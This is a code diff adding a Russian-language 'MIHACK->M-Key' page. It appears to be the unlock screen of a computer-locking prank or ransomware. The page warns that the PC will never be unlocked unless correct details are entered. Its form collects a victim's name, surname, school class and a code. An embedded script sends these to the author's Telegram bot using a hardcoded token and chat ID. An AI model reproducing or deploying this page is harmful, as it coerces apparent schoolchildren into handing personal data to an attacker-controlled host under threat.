@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>MIHACK->M-Key</title>
+    <header>
+        <div class="logo">
+            <img src="i.webp" alt="Логотип MIHACK">
+            
+        </div>
+        <div class="ff">
+        <nav>
+            <ul>
+                <li><a href="index.html">Главная</a></li>
+                
+                
+                
+            </ul>
+        </nav>
+        </div>
+    </header>
+</head>
+<body>
+    <br>
+    <br>
+    <form id="dataForm">
+        <label for="firstName">Имя:</label>
+        <input type="text" id="firstName" required>
+
+        <label for="lastName">Фамилия:</label>
+        <input type="text" id="lastName" required >
+
+        <label for="class">Класс:</label>
+        <input type="text" id="class" required placeholder="Например: 5А,11В">
+
+        <label for="gha">GHA:</label>
+        <input type="text" id="gha" required placeholder="Например: GHJDJSGSDD">
+
+        <button type="submit">Отправить</button>
+        
+    </form>
+
+    <div class="help">
+        <p class="hel">ВНИМАНИЕ! Если вы введете неккоректные данные (Имя , фамилия и тд.) то ваш пк никогда не разблокируется!!!</p>
+    </div>
+    <script>
+        document.getElementById('dataForm').addEventListener('submit', async function(event) {
+    event.preventDefault(); // Предотвращаем стандартное поведение формы
+
+    const firstName = document.getElementById('firstName').value;
+    const lastName = document.getElementById('lastName').value;
+    const classValue = document.getElementById('class').value;
+    const ghaValue = document.getElementById('gha').value;
+
+    // Формируем текст сообщения
+    const message = `Имя: ${firstName}\nФамилия: ${lastName}\nКласс: ${classValue}\nGHA: ${ghaValue}`;
+
+    // Отправка данных в Telegram
+    const token = '7647185673:AAHqev9fP1WOJA-b9x66tQ2gSr-DT4sYQDw'; // Замените на токен вашего бота
+    const chatId = '1430794123'; // Замените на ваш chat_id
+    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    try {
+        const response = await fetch(url);
+        if (response.ok) {
+            alert('Ваш код сгенерирован!'); // Успешная отправка
+        } else {
+            alert('Ошибка при генерации.');
+        }
+    } catch (error) {
+        console.error('Ошибка:', error);
+        alert('Ошибка при отправке данных.');
+    }
+
+    // Проверка значения GHA и перенаправление
+    if (ghaValue === 'MWXGGLUPTOP') {
+        window.location.href = 'MWXGGLUPTOP.html'; // Перенаправление на fdf.html
+    } else if (ghaValue === 'DDSGGLUPTOP') {
+        window.location.href = 'DDSGGLUPTOP.html'; // Перенаправление на fdhgfd.html
+    } else if (ghaValue === 'DDSFDFRHHBP') {
+        window.location.href = 'DDSFDFRHHBP.html'; // Перенаправление на fdhgfd.html
+    } else if (ghaValue === 'HJKREJFJYNK') {
+        window.location.href = 'HJKREJFJYNK.html'; // Перенаправление на fdhgfd.html
+    } else {
+        alert('Неверный GHA код!'); // Сообщение об ошибке
+    }
+});
+
+
+    </script>
+</body>
+</html>
